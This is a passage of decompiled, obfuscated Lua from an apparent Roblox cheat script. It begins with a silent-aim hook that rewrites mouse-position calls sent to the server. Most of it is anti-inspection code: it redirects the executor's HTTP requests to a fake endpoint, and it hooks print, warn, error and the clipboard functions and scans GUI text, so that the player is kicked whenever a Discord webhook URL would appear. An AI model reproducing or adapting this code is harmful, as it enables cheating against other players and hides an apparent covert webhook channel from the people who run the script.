        if not vu363.main.enabled or (getnamecallmethod() ~= "FireServer" or v377[2] ~= "UpdateMousePos") then
            return vu376(...)
        end
        v377[3] = vu362.Character[vu363.main.aimpart].Position + vu362.Character[vu363.main.aimpart].Velocity * vu363.main.prediction
        return vu376(unpack(v377))
    end)
    vu1:Notification("Notification", "private leaked Activated", "Okay!")
end)
local v378 = cloneref(Game)
if not v378:IsLoaded() then
    v378.Loaded:Wait()
end
local vu379 = v378:GetService("Players")
local vu380 = v378:GetService("CoreGui")
local vu381 = vu379.LocalPlayer
local vu382 = vu381:FindFirstChildOfClass("PlayerGui")
local vu383 = {}
local vu384 = syn and syn.request or http and http_request or (http and http.request or fluxus and fluxus.request or (krnl and krnl.request or sentinel and sentinel.request) or (SirHurt and http_request or EasyExploits and http.request or (sw and sw.request or tempered and tempered.request)) or (codex and codex.request or delta and delta.request or (comet and comet.request or oxygen_u and oxygen_u.request) or (venom and venom.request or wrd and wrd.request or (electron and electron.request or request))))
task.spawn(function()
    while task.wait(1) do
        if vu384 then
            vu383[10] = hookfunction(vu384, function(p385)
                p385.Url = "https://www.troll-url.com/fake-endpoint"
                p385.Method = "GET"
                p385.Headers = {
                    ["User-Agent"] = "TheRealX_ORA"
                }
                return vu383[10](p385)
            end)
        end
        vu383[1] = hookfunction(print, newcclosure(function(p386)
            if not string.find(tostring(p386):lower(), "https://discord.com/api/webhook") then
                return vu383[1](p386)
            end
            vu379.LocalPlayer:Kick("TheRealX_ORA DID NOT WANT YOU TO PRINT THIS!")
            task.wait(5)
            vu381:Destroy()
        end))
        vu383[2] = hookfunction(warn, newcclosure(function(p387)
            if not string.find(tostring(p387):lower(), "https://discord.com/api/webhook") then
                return vu383[2](p387)
            end
            vu379.LocalPlayer:Kick("TheRealX_ORA DID NOT WANT YOU TO WARN PRINT THIS!")
            task.wait(5)
            vu381:Destroy()
        end))
        vu383[3] = hookfunction(error, newcclosure(function(p388, p389)
            if not string.find(tostring(p388):lower(), "https://discord.com/api/webhook") then
                return vu383[3](p388, p389)
            end
            vu379.LocalPlayer:Kick("TheRealX_ORA DID NOT WANT YOU TO ERROR PRINT THIS!")
            task.wait(5)
            vu381:Destroy()
        end))
        if getgenv().rconsoleprint then
            vu383[4] = hookfunction(getgenv().rconsoleprint, newcclosure(function(p390)
                if not string.find(tostring(p390):lower(), "https://discord.com/api/webhook") then
                    return vu383[4](p390)
                end
                vu379.LocalPlayer:Kick("TheRealX_ORA DID NOT WANT YOU TO PRINT THIS IN RCONSOLE!")
                task.wait(5)
                vu381:Destroy()
            end))
        end
        if getgenv().setclipboard then
            vu383[5] = hookfunction(getgenv().setclipboard, newcclosure(function(p391)
                if not string.find(tostring(p391):lower(), "https://discord.com/api/webhook") then
                    return vu383[5](p391)
                end
                vu379.LocalPlayer:Kick("TheRealX_ORA DID NOT WANT YOU TO COPY THIS!")
                task.wait(5)
                vu381:Destroy()
            end))
        end
        if getgenv().setrbxclipboard then
            vu383[6] = hookfunction(getgenv().setrbxclipboard, newcclosure(function(p392)
                if not string.find(tostring(p392):lower(), "https://discord.com/api/webhook") then
                    return vu383[6](p392)
                end
                vu379.LocalPlayer:Kick("TheRealX_ORA DID NOT WANT YOU TO COPY THIS!")
                task.wait(5)
                vu381:Destroy()
            end))
        end
        local v393 = vu382
        local v394, v395, v396 = pairs(v393:GetDescendants())
        while true do
            local v397
            v396, v397 = v394(v395, v396)
            if v396 == nil then
                break
            end
            if (v397:IsA("TextLabel") or v397:IsA("TextBox")) and string.find(tostring(v397.Text):lower(), "https://discord.com/api/webhook") then
                v397.Text = ""
                vu379.LocalPlayer:Kick("TheRealX_ORA DID NOT WANT YOU TO COPY THIS!")
                task.wait(5)
                vu381:Destroy()
            end
        end
        local v398 = vu380
        local v399, v400, v401 = pairs(v398:GetDescendants())
        while true do
            local v402
            v401, v402 = v399(v400, v401)
            if v401 == nil then
                break
            end
            if (v402:IsA("TextLabel") or v402:IsA("TextBox")) and string.find(tostring(v402.Text):lower(), "https://discord.com/api/webhook") then
                v402.Text = ""
                vu379.LocalPlayer:Kick("TheRealX_ORA DID NOT WANT YOU TO COPY THIS!")
                task.wait(5)
                vu381:Destroy()
            end
        end
    end
end)
